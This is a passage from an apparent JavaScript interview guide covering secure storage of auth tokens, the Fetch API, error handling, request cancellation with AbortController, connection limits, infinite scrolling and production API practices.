| Vulnerable to XSS token theft | ✅ Yes | ❌ No |
| Vulnerable to CSRF | ❌ Not directly (must be explicitly attached) | ⚠️ Yes, unless mitigated with `SameSite` and CSRF tokens |

> 💡 Neither option is a silver bullet — `HttpOnly` cookies protect against XSS token theft but open the door to CSRF if not paired with `SameSite` and/or a CSRF token. `localStorage` avoids CSRF but is fully exposed to XSS. This is a genuine security trade-off, not a simple "cookies are always better" rule.

---

### ✅ Best Practices for Storing Authentication Data

1. Store session identifiers / refresh tokens in **`HttpOnly`, `Secure`, `SameSite` cookies** set by the server — this is the industry-standard recommendation to protect against XSS-based token theft.
2. Pair cookie-based auth with **CSRF protection** (`SameSite=Strict`/`Lax`, and/or CSRF tokens) since cookies are sent automatically.
3. If an access token must be readable by JavaScript (e.g., for an `Authorization` header pattern), keep its lifetime very short and keep it **in memory** (a JS variable, not `localStorage`) — it disappears on refresh, but that's an acceptable trade-off for the security gained.
4. Never store long-lived, high-privilege tokens in `localStorage` or `sessionStorage`.
5. Always sanitize any user-generated content rendered on the page (Question 10) — the underlying defense against token theft is preventing XSS from ever running in the first place.

---

### 🎤 Interview Answer

`localStorage` is readable by any JavaScript running on the page, including malicious code injected through an XSS vulnerability, so storing sensitive data like auth tokens there means a single XSS bug can leak every user's session. `HttpOnly` cookies solve this by being set from the server and made completely inaccessible to JavaScript — `document.cookie` can't see them — while still being automatically attached to matching requests by the browser. The trade-off is that cookies are vulnerable to CSRF unless paired with `SameSite` attributes and/or CSRF tokens. The recommended practice is to store session/auth data in `HttpOnly`, `Secure`, `SameSite` cookies, add CSRF protections, and never put long-lived sensitive tokens in `localStorage` or `sessionStorage`.

---

### ❓ Follow-up Questions

- Why can't JavaScript read an `HttpOnly` cookie even from the same origin?
- What is CSRF, and how does `SameSite` help prevent it?
- What's a reasonable strategy if an access token genuinely needs to be readable by JavaScript?
- Does using `HttpOnly` cookies eliminate the need to prevent XSS entirely?

---

## Fetch API & Networking

## 21. What is the Fetch API, why was it introduced, how does it differ from XMLHttpRequest and Axios, and what does `fetch()` return?

### 📖 Overview

The **Fetch API** is the modern, built-in browser API for making HTTP requests from JavaScript. It was introduced to replace the older, more awkward **`XMLHttpRequest` (XHR)**, offering a cleaner, **Promise-based** interface.

```js
fetch("/api/products")
  .then((response) => response.json())
  .then((data) => console.log(data));
```

---

### 🎯 Why Was It Introduced?

`XMLHttpRequest` (from the early 2000s) has a callback-based API that is verbose and easy to get wrong:

```js
// Old XHR style
const xhr = new XMLHttpRequest();
xhr.open("GET", "/api/products");
xhr.onload = () => {
  if (xhr.status >= 200 && xhr.status < 300) {
    console.log(JSON.parse(xhr.responseText));
  }
};
xhr.onerror = () => console.log("Request failed");
xhr.send();
```

`fetch()` was designed to fix this by returning a **Promise**, fitting naturally with `.then()` chains and `async`/`await`, and providing a cleaner, more consistent API surface (`Request`, `Response`, `Headers` objects).

---

### ⚖️ `fetch()` vs `XMLHttpRequest` vs Axios

| Feature | `XMLHttpRequest` | `fetch()` | Axios (library) |
|---------|--------------------|-----------|-------------------|
| API style | Callback-based | Promise-based | Promise-based |
| Built into the browser | ✅ Yes | ✅ Yes | ❌ No — third-party library |
| Automatic JSON parsing | ❌ Manual `JSON.parse()` | ❌ Manual `.json()` call | ✅ Automatic |
| Rejects on HTTP error status (404/500) | ❌ No (checks `status` manually) | ❌ No (see Question 23) | ✅ Yes, throws for non-2xx by default |
| Request/response interceptors | ❌ No | ❌ No (needs manual wrapping) | ✅ Built-in |
| Upload progress tracking | ✅ Yes | ❌ Not natively supported | ✅ Yes |
| Built-in request cancellation | ⚠️ `xhr.abort()` | ✅ `AbortController` (Question 24) | ✅ Supports `AbortController` too |
| Automatic request timeout | ❌ Manual | ❌ Manual (via `AbortController` + `setTimeout`) | ✅ Built-in `timeout` option |

---

### ⚙️ What Does `fetch()` Return?

`fetch()` always returns a **Promise that resolves to a `Response` object**, as soon as the server sends back HTTP headers — **not** the full body yet.

```js
const response = fetch("/api/products"); // Promise<Response>

fetch("/api/products").then((response) => {
  response.ok;      // true if status is 200-299
  response.status;   // e.g. 200, 404, 500
  response.headers;  // Headers object
  response.json();   // returns ANOTHER Promise, resolving with the parsed body
});
```

You need a **second** asynchronous step (`.json()`, `.text()`, `.blob()`, etc.) to actually read and parse the response **body**, because the body may still be streaming in when the first Promise resolves.

```js
async function getProducts() {
  const response = await fetch("/api/products"); // wait for headers
  const data = await response.json();            // wait for + parse the body
  return data;
}
```

---

### 🎤 Interview Answer

The Fetch API is the modern, built-in browser API for making HTTP requests, introduced to replace the older callback-based `XMLHttpRequest` with a cleaner, Promise-based interface that works naturally with `async`/`await`. `fetch()` returns a Promise that resolves with a `Response` object as soon as the response headers arrive — reading the actual body requires a second async call like `response.json()`. Compared to Axios, a popular third-party library, `fetch()` is built-in and needs no installation, but Axios offers convenience features out of the box like automatic JSON parsing, request/response interceptors, and automatically rejecting on non-2xx HTTP status codes, which `fetch()` does not do by default.

---

### ❓ Follow-up Questions

- Why does `fetch()` need two `await` steps to get parsed JSON data?
- Why doesn't `fetch()` reject the Promise for a 404 or 500 response?
- What are the main advantages Axios offers over raw `fetch()`?
- How would you implement a request timeout using `fetch()`?

---

## 22. How do you make HTTP requests using Fetch, and how do you handle request headers, request bodies, and different HTTP methods?

### 📖 Overview

By default, `fetch(url)` sends a simple `GET` request. To send other methods, custom headers, or a request body, you pass a second **options object**.

---

### ⚙️ Basic GET Request

```js
const response = await fetch("/api/products");
const data = await response.json();
```

---

### ⚙️ Full Request Configuration

```js
const response = await fetch("/api/products", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Authorization": "Bearer " + token,
  },
  body: JSON.stringify({ name: "New Product", price: 25 }),
});

const data = await response.json();
```

---

### ⚙️ Common HTTP Methods

```js
// GET (default)
fetch("/api/products");

// POST — create
fetch("/api/products", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ name: "Shoes" }),
});

// PUT — full replace
fetch("/api/products/1", {
  method: "PUT",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ name: "Shoes", price: 40 }),
});

// PATCH — partial update
fetch("/api/products/1", {
  method: "PATCH",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ price: 35 }),
});

// DELETE
fetch("/api/products/1", { method: "DELETE" });
```

---

### ⚙️ Request Bodies

The `body` option accepts several formats, and the `Content-Type` header should match what you send:

```js
// JSON (most common)
body: JSON.stringify({ name: "Shoes" }),
headers: { "Content-Type": "application/json" }

// Form data (e.g., for file uploads)
const formData = new FormData();
formData.append("file", fileInput.files[0]);
fetch("/upload", { method: "POST", body: formData });
// Note: don't manually set Content-Type for FormData —
// the browser sets it automatically with the correct multipart boundary.

// URL-encoded form data
body: new URLSearchParams({ username: "alice", password: "secret" }),
headers: { "Content-Type": "application/x-www-form-urlencoded" }

// Plain text
body: "Hello world",
headers: { "Content-Type": "text/plain" }
```

---

### ⚙️ Reading Different Response Types

```js
response.json();    // parse as JSON
response.text();     // plain text
response.blob();     // binary data (e.g., images, files)
response.formData(); // multipart form data
response.arrayBuffer(); // raw binary buffer
```

> ⚠️ Each of these can only be called **once** per response — the response body is a stream that gets "consumed" the first time you read it. Calling `.json()` twice on the same response throws an error. If you need the data in two forms, clone the response first: `response.clone()`.

---

### ⚙️ Sending Cookies with Requests

By default, `fetch()` only sends cookies for **same-origin** requests. For cross-origin requests where cookies are needed:

```js
fetch("https://api.example.com/data", {
  credentials: "include", // send cookies even cross-origin (requires proper CORS setup on the server)
});
```

| `credentials` value | Behavior |
|----------------------|----------|
| `"omit"` | Never send cookies |
| `"same-origin"` | Send cookies only for same-origin requests (default) |
| `"include"` | Always send cookies, including cross-origin |

---

### 🎤 Interview Answer

`fetch(url, options)` sends a `GET` by default; to send other methods, you set `method` in the options object, along with `headers` for things like `Content-Type` and `Authorization`, and `body` for the request payload — usually a `JSON.stringify()`'d object with a matching `application/json` Content-Type, or a `FormData` object for file uploads, where you should let the browser set the Content-Type automatically. Reading the response requires calling a method like `.json()` or `.text()`, which returns another Promise, and can only be called once per response since the body is a stream. For cross-origin requests that need cookies, you set `credentials: "include"`.

---

### ❓ Follow-up Questions

- Why shouldn't you manually set `Content-Type` when sending `FormData`?
- What happens if you call `response.json()` twice on the same response?
- What's the difference between PUT and PATCH?
- What does the `credentials` option control, and what's its default value?

---

## 23. How does Fetch handle errors, why doesn't it reject on HTTP 404/500 responses, and what are the best practices for error handling?

### 📖 Overview

One of the most common `fetch()` mistakes is assuming it behaves like other Promise-based HTTP libraries and automatically throws/rejects on a failed HTTP status like 404 or 500. **It does not.**

---

### ⚠️ The Core Behavior

`fetch()`'s Promise only **rejects** for **network-level failures** — things that prevent a response from being received at all:

- No internet connection.
- DNS lookup failure.
- CORS blocking the request entirely.
- The request being aborted (Question 24).

`fetch()`'s Promise **resolves successfully** (does not reject) even for HTTP error status codes like 404, 500, or 403 — because, technically, the server **did** respond; it just responded with an error status.

```js
try {
  const response = await fetch("/api/does-not-exist");
  console.log(response.ok);    // false
  console.log(response.status); // 404
  // No error was thrown! The catch block below will NOT run for this.
} catch (error) {
  console.log("This only runs for network failures, not 404/500");
}
```

---

### ✅ Correct Error Handling Pattern

You must **manually** check `response.ok` (or `response.status`) and throw an error yourself if needed:

```js
async function getProducts() {
  try {
    const response = await fetch("/api/products");

    if (!response.ok) {
      throw new Error(`Request failed with status ${response.status}`);
    }

    return await response.json();
  } catch (error) {
    // Catches BOTH network failures AND our manually-thrown HTTP errors
    console.error("Failed to fetch products:", error.message);
    throw error; // re-throw if the caller needs to handle it too
  }
}
```

`response.ok` is a convenient shortcut — `true` for any status in the 200-299 range, `false` otherwise.

---

### ⚖️ Fetch vs Axios Error Behavior

| Scenario | `fetch()` | Axios |
|----------|-----------|-------|
| Network failure (no internet, DNS error) | Promise rejects | Promise rejects |
| HTTP 404 / 500 response | Promise **resolves** (`response.ok === false`) | Promise **rejects** by default |
| Manual check required | ✅ Yes, check `response.ok` | ❌ No (though configurable) |

This is a common source of bugs when developers migrate between the two, or assume Fetch behaves like Axios.

---

### ✅ Best Practices for Fetch Error Handling

1. Always check `response.ok` before parsing the body, and throw explicitly if it's `false`.
2. Wrap the whole request in `try/catch` to also catch genuine network failures.
3. Read the error body when possible — APIs often return useful error details in JSON even on failure statuses:

```js
if (!response.ok) {
  const errorBody = await response.json().catch(() => null);
  throw new Error(errorBody?.message || `Request failed: ${response.status}`);
}
```

4. Distinguish between different failure types where it matters (network failure vs. 4xx client error vs. 5xx server error) so the UI can show an appropriate message ("check your connection" vs. "something went wrong on our end").
5. Centralize this logic in a shared helper/wrapper function instead of repeating the `response.ok` check everywhere (see Question 27).

---

### 🎤 Interview Answer

`fetch()`'s returned Promise only rejects for genuine network-level failures — no connection, DNS errors, CORS blocks, or an aborted request. It does **not** reject just because the server responded with an error status like 404 or 500, since technically a response was still received. This means you have to manually check `response.ok` (or `response.status`) after every fetch and explicitly `throw` an error yourself if the request failed, typically inside a `try/catch` block so both network failures and manually-thrown HTTP errors are caught in the same place. This is a common gotcha, especially for developers coming from libraries like Axios, which do reject automatically on non-2xx responses.

---

### ❓ Follow-up Questions

- Why doesn't `fetch()` treat a 404 as an error automatically?
- What kinds of failures actually cause `fetch()`'s Promise to reject?
- How would you build a reusable wrapper around `fetch()` that throws consistently?
- How do you read error details from a failed response's JSON body?

---

## 24. What is `AbortController`, how does it work internally, and how do you cancel Fetch requests?

### 📖 Overview

**`AbortController`** is a built-in browser API that lets you **cancel** an in-progress `fetch()` request (or other abortable async operations). This is essential for avoiding wasted network usage and race conditions, like when a user navigates away or types a new search query before the previous request finishes.

---

### ⚙️ Basic Usage

```js
const controller = new AbortController();

fetch("/api/products", { signal: controller.signal })
  .then((response) => response.json())
  .then((data) => console.log(data))
  .catch((error) => {
    if (error.name === "AbortError") {
      console.log("Request was cancelled");
    } else {
      console.log("Some other error occurred", error);
    }
  });

// Later, to cancel:
controller.abort();
```

---

### ⚙️ How It Works Internally

1. `new AbortController()` creates a controller object with a `.signal` property (an `AbortSignal`).
2. You pass `controller.signal` into `fetch()`'s options — this "wires up" the request to that specific controller.
3. `fetch()` internally listens for an `abort` event on that signal.
4. When you call `controller.abort()`, the signal fires an `abort` event.
5. `fetch()` sees this event, immediately stops the in-flight network request, and **rejects** its Promise with an `AbortError`.

```
new AbortController()
        │
        ▼
   controller.signal ──passed into──▶ fetch(url, { signal })
        │
        ▼
 controller.abort() called
        │
        ▼
  signal fires "abort" event
        │
        ▼
 fetch() cancels the request, rejects Promise with AbortError
```

---

### ⚙️ Common Use Case: Cancel a Previous Search Request

A very common real bug: a user types fast in a search box, firing multiple requests, and an **older, slower** request resolves **after** a newer one — overwriting the correct, newer results with stale data.

```js
let controller;

async function search(query) {
  if (controller) controller.abort(); // cancel any previous in-flight request
  controller = new AbortController();

  try {
    const response = await fetch(`/api/search?q=${query}`, {
      signal: controller.signal,
    });
    const results = await response.json();
    renderResults(results);
  } catch (error) {
    if (error.name !== "AbortError") {
      console.error("Search failed:", error);
    }
    // AbortError is expected/intentional here — safely ignored
  }
}
```

---

### ⚙️ Automatic Cancellation with a Timeout

```js
function fetchWithTimeout(url, timeoutMs) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

  return fetch(url, { signal: controller.signal }).finally(() => {
    clearTimeout(timeoutId); // clean up the timer if the request finishes first
  });
}
```

---

### ⚙️ Cleaning Up in React (a Very Common Pattern)

```jsx
useEffect(() => {
  const controller = new AbortController();

  fetch("/api/data", { signal: controller.signal })
    .then((res) => res.json())
    .then(setData)
    .catch((err) => {
      if (err.name !== "AbortError") setError(err);
    });

  return () => controller.abort(); // cancel if the component unmounts before the request finishes
}, []);
```

This prevents the classic React warning/bug of trying to update state on an unmounted component.

---

### 🎤 Interview Answer

`AbortController` is a browser API that lets you cancel in-progress asynchronous operations, most commonly a `fetch()` request. You create a controller, pass its `.signal` into `fetch()`'s options, and calling `controller.abort()` later causes `fetch()` to immediately stop the request and reject its Promise with an `AbortError`. This is essential for avoiding race conditions — for example, cancelling a previous search request before starting a new one so an older, slower response can't overwrite newer results — and for cleaning up requests when a component unmounts, or implementing request timeouts by combining `AbortController` with `setTimeout`.

---

### ❓ Follow-up Questions

- What error name/type does an aborted fetch throw, and how do you distinguish it from a real failure?
- How would you implement a fetch timeout using `AbortController`?
- Why is cancelling stale requests important in a search-as-you-type feature?
- Can `AbortController` cancel operations other than `fetch()`?

---

## 25. How does the Fetch API work internally, and how do browsers handle concurrent network requests?

### 📖 Overview

`fetch()` doesn't perform the network request itself inside the JavaScript engine — it delegates the actual work to the browser's networking stack, similar to how `setTimeout()` delegates to a timer system (as covered in the Event Loop chapter). Browsers also impose limits on how many requests can run **at once** to the same server.

---

### ⚙️ Internal Flow of a `fetch()` Call

1. JavaScript calls `fetch(url, options)`.
2. The browser immediately returns a **pending Promise** and hands the actual request off to the browser's **networking layer** (outside the JS engine).
3. The networking layer performs, in order: DNS resolution, opening a TCP connection (or reusing an existing one), a TLS handshake (for HTTPS), sending the HTTP request, and waiting for the response.
4. Once response **headers** arrive, the `fetch()` Promise **resolves** with a `Response` object — the body may still be streaming in.
5. Reading the body (`.json()`, `.text()`, etc.) returns a **second** Promise that resolves once the full body has been received and parsed.
6. Both resolution steps place their callbacks into the **Microtask Queue** (since they're Promise-based), which the Event Loop processes with high priority ahead of macrotasks like `setTimeout`.

This is the same architecture discussed in the Event Loop chapter — the browser's Web APIs perform the actual work outside the Call Stack, and the Event Loop schedules the resulting callbacks once the work is done.

---

### ⚙️ Concurrent Requests: Connection Limits

Browsers limit how many simultaneous TCP connections can be open **to the same host** at once — historically **around 6 connections per host** for HTTP/1.1 (the exact number varies slightly by browser).

```js
// If you fire 20 requests to the same host at once...
for (let i = 0; i < 20; i++) {
  fetch(`/api/item/${i}`);
}
```

...only about 6 will actually be in-flight simultaneously; the rest **queue** in the browser and start automatically as earlier ones complete.

> 💡 **HTTP/2 and HTTP/3** remove this practical limit for requests to the same host — they support true multiplexing, allowing many requests to share a single connection efficiently. The classic "6 connections per host" limit is mainly an HTTP/1.1-era constraint.

---

### ⚙️ Running Requests in Parallel from JavaScript's Side

Even though the browser handles the actual networking outside the Call Stack, you still control **how many requests you kick off** and how you wait for them:

```js
// Sequential — slow, each waits for the previous to finish
const a = await fetch("/api/a");
const b = await fetch("/api/b");

// Parallel — all start immediately, wait for all to finish
const [a, b] = await Promise.all([fetch("/api/a"), fetch("/api/b")]);
```

`Promise.all()` doesn't change how the browser schedules the underlying connections — it just lets your JavaScript code **kick off** multiple fetches without waiting for each one before starting the next, and then wait for all of them together.

---

### 🌍 Real-World Example

Imagine a highway (the network) with a limited number of toll booths open to a specific destination (a host). You can send as many cars (requests) as you want, but only a handful can actually pass through the booths to that destination at once — the rest wait in a queue and start moving as booths free up. A newer, wider highway (HTTP/2) has far more capacity and barely needs the cars to queue at all.

---

### 🎤 Interview Answer

When JavaScript calls `fetch()`, the browser immediately returns a pending Promise and delegates the actual network work — DNS lookup, connection setup, sending the request, waiting for a response — to its networking layer, outside the JS Call Stack. Once response headers arrive, the Promise resolves with a `Response` object, and reading the body is a second, separate asynchronous step. Both resolutions go through the Microtask Queue, same as any other Promise. For concurrency, browsers historically limited simultaneous connections to around 6 per host under HTTP/1.1, queuing any extra requests until a connection frees up — HTTP/2 and HTTP/3 remove this limitation through multiplexing. On the JavaScript side, `Promise.all()` lets you kick off multiple fetches without waiting sequentially, and wait for all of them to complete together.

---

### ❓ Follow-up Questions

- Why does HTTP/2 remove the "6 connections per host" limitation?
- What's the difference between `Promise.all()` and `Promise.allSettled()` when running multiple fetches?
- Where does `fetch()`'s actual networking work happen relative to the JS Call Stack?
- Why does resolving the `fetch()` Promise happen before the body is fully downloaded?

---

## 26. How would you prevent duplicate API requests, cancel unnecessary requests, and implement infinite scrolling?

### 📖 Overview

These three problems are closely related — they're all about controlling **when** and **how many** requests actually get sent, to avoid wasted bandwidth, race conditions, and bad user experience.

---

### ✅ Preventing Duplicate Requests

**Problem**: A user double-clicks a "Submit" button, or a component re-renders and accidentally fires the same fetch twice.

**Solution 1 — Disable the trigger while a request is in-flight:**

```js
let isSubmitting = false;

async function submitForm(data) {
  if (isSubmitting) return; // ignore duplicate calls
  isSubmitting = true;

  try {
    await fetch("/api/submit", { method: "POST", body: JSON.stringify(data) });
  } finally {
    isSubmitting = false;
  }
}
```

**Solution 2 — Debounce rapid-fire triggers** (e.g., search-as-you-type):

```js
function debounce(fn, delay) {
  let timeoutId;
  return (...args) => {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => fn(...args), delay);
  };
}

const debouncedSearch = debounce(search, 300); // only fires 300ms after the user stops typing
```

**Solution 3 — Cache/reuse an in-flight Promise for identical requests:**

```js
const pendingRequests = new Map();

function fetchOnce(url) {
  if (pendingRequests.has(url)) {
    return pendingRequests.get(url); // reuse the existing in-flight request
  }

  const promise = fetch(url).finally(() => pendingRequests.delete(url));
  pendingRequests.set(url, promise);
  return promise;
}
```

---

### ✅ Cancelling Unnecessary Requests

Use `AbortController` (Question 24) to cancel requests that are no longer needed — for example, a previous search query, or a request from a component that has since unmounted.

```js
let controller;

async function search(query) {
  controller?.abort(); // cancel the previous search
  controller = new AbortController();

  const response = await fetch(`/api/search?q=${query}`, { signal: controller.signal });
  return response.json();
}
```

---

### ✅ Implementing Infinite Scrolling

Infinite scrolling loads more data as the user approaches the bottom of the page, instead of loading everything upfront or requiring pagination clicks.

**Step 1 — Detect when the user nears the bottom**, typically with the `IntersectionObserver` API (more efficient than manually calculating scroll position on every `scroll` event):

```js
const sentinel = document.getElementById("scroll-sentinel"); // an empty element at the bottom of the list

const observer = new IntersectionObserver((entries) => {
  if (entries[0].isIntersecting) {
    loadMoreItems();
  }
});

observer.observe(sentinel);
```

**Step 2 — Fetch and append the next page, guarding against duplicate/overlapping loads:**

```js
let page = 1;
let isLoading = false;
let hasMore = true;

async function loadMoreItems() {
  if (isLoading || !hasMore) return; // prevent duplicate/overlapping fetches
  isLoading = true;

  try {
    const response = await fetch(`/api/items?page=${page}`);
    const data = await response.json();

    appendItemsToList(data.items);
    hasMore = data.hasMore;
    page++;
  } finally {
    isLoading = false;
  }
}
```

**Key considerations**:

- Always guard with an `isLoading` flag to prevent firing multiple overlapping requests if the user scrolls quickly.
- Track `hasMore`/`hasNextPage` from the API to know when to stop observing.
- Prefer `IntersectionObserver` over listening to the `scroll` event directly — it's more performant since it doesn't run on every scroll pixel and doesn't require manual position math.
- Consider list virtualization (Question 7) if the total accumulated list grows very large, so the DOM doesn't end up with thousands of live nodes.

---

### 🎤 Interview Answer

Duplicate requests are prevented by guarding triggers with an in-flight flag, debouncing rapid user input like search-as-you-type, or caching/reusing the Promise for an identical in-flight request. Unnecessary requests — like a stale search query superseded by a newer one — are cancelled using `AbortController`, calling `.abort()` on the previous controller before starting a new request. Infinite scrolling is typically implemented with an `IntersectionObserver` watching a sentinel element near the bottom of the list; when it becomes visible, the next page is fetched and appended, guarded by an `isLoading` flag to prevent overlapping requests and a `hasMore` flag to know when to stop. `IntersectionObserver` is preferred over manually tracking the `scroll` event because it's more performant and doesn't require manual scroll-position math.

---

### ❓ Follow-up Questions

- Why is `IntersectionObserver` more efficient than a `scroll` event listener for infinite scroll?
- How would you prevent a double-click on a submit button from firing two requests?
- What's the difference between debouncing a search input and cancelling its previous request — do you need both?
- How would list virtualization help an infinite-scroll page that's grown very long?

---

## 27. What are the best practices for API communication in production applications?

### 📖 Overview

Bringing together everything from this chapter, here's how production applications typically structure their API communication layer to be reliable, secure, and maintainable.

---

### ✅ Best Practices

#### 1. Centralize Fetch Logic in a Shared Client

Don't repeat `fetch()`, header setup, and error-checking in every component. Wrap it once:

```js
async function apiClient(path, options = {}) {
  const response = await fetch(`https://api.example.com${path}`, {
    ...options,
    headers: {
      "Content-Type": "application/json",
      ...options.headers,
    },
  });

  if (!response.ok) {
    const errorBody = await response.json().catch(() => null);
    throw new Error(errorBody?.message || `Request failed: ${response.status}`);
  }

  return response.json();
}
```

#### 2. Always Handle Errors Explicitly

Manually check `response.ok` (Question 23) and provide meaningful, user-facing error messages instead of leaking raw error objects into the UI.

#### 3. Cancel Requests That Are No Longer Needed

Use `AbortController` for searches, component unmounts, and route changes (Question 24, 26).

#### 4. Set Sensible Timeouts

Combine `AbortController` with `setTimeout` so a hung request doesn't leave the UI stuck loading forever.

#### 5. Retry Transient Failures (Carefully)

For network blips or 5xx errors, a small number of retries with **exponential backoff** can improve resilience — but never retry indefinitely, and never retry non-idempotent requests (like a `POST` that creates a resource) without safeguards, since that risks duplicate side effects.

```js
async function fetchWithRetry(url, options, retries = 3, delay = 500) {
  for (let attempt = 0; attempt <= retries; attempt++) {
    try {
      return await apiClient(url, options);
    } catch (error) {
      if (attempt === retries) throw error;
      await new Promise((resolve) => setTimeout(resolve, delay * 2 ** attempt));
    }
  }
}
```

#### 6. Store and Send Auth Tokens Securely

Prefer `HttpOnly` cookies for session/auth data over `localStorage` (Question 20).

#### 7. Avoid Duplicate/Overlapping Requests

Guard with loading flags, debouncing, or in-flight request caching (Question 26).

#### 8. Validate and Sanitize Data on Both Ends

Never trust client-side validation alone — the server must re-validate. And never render API-returned HTML without sanitizing it first (Question 10).

#### 9. Use Environment-Specific Base URLs / Config

Keep API base URLs, keys, and environment differences (dev/staging/prod) in configuration, not hardcoded inline in fetch calls scattered across the codebase.

#### 10. Show Proper Loading and Error States in the UI

Every request has three states worth handling explicitly: loading, success, and error — silently failing or leaving a spinner stuck forever is a common real-world bug.

#### 11. Paginate or Virtualize Large Data Sets

Don't fetch or render more data than the user can realistically see at once (Questions 7, 26).

#### 12. Log and Monitor API Failures

In production, track failed requests (status codes, timeouts, retries) through logging/monitoring tools so issues are caught before users report them.

---

### 🎤 Interview Answer

Production API communication should go through a centralized client that consistently handles headers, JSON parsing, and error checking, rather than repeating `fetch()` logic everywhere. Every request should explicitly check `response.ok` and surface meaningful errors, be cancellable via `AbortController` when no longer needed, and have a sensible timeout so the UI never hangs indefinitely. Transient failures can be retried with exponential backoff, but retries must respect idempotency to avoid duplicate side effects. Authentication data should be stored in `HttpOnly` cookies rather than `localStorage`, duplicate/overlapping requests should be guarded against with flags or debouncing, and the UI should explicitly handle loading, success, and error states. Finally, large data sets should be paginated or virtualized, and failures should be logged and monitored so issues surface proactively rather than through user complaints.

---

### ❓ Follow-up Questions

- Why is exponential backoff preferred over retrying immediately and repeatedly?
- Why is retrying a non-idempotent `POST` request risky?
- What's the benefit of centralizing fetch logic into one client function instead of calling `fetch()` directly everywhere?
- How would you decide what data belongs in `HttpOnly` cookies vs an in-memory JavaScript variable?

---
